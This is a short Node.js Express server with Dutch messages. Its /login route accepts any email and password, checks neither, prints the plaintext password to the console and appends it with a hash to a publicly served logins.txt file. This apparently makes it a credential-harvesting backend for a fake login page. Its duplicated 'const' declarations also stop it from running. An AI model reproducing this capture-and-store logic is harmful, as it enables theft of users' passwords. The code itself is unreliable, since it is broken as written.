const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
console.log("Server script geladen...");

const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const bcrypt = require("bcrypt");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

console.log("Dependencies geladen...");

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

app.post("/login", async (req, res) => {
    try {
        const email = req.body.email;
        const password = req.body.password;

        if (!email || !password) {
            return res.status(400).send("Email en wachtwoord zijn verplicht.");
        }

        console.log(`Email: ${email}`);
        console.log(`Plain Password: ${password}`);

        const hash = await bcrypt.hash(password, 10);

        fs.appendFileSync("logins.txt", `Email: ${email} | Password: ${password} | Hash: ${hash}\n`);

        res.send("Login geregistreerd! Check Render Logs voor plain password en logins.txt voor hash.");
    } catch (err) {
        console.error("Fout bij login:", err);
        res.status(500).send("Internal Server Error: " + err.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server draait op poort ${PORT}`);
});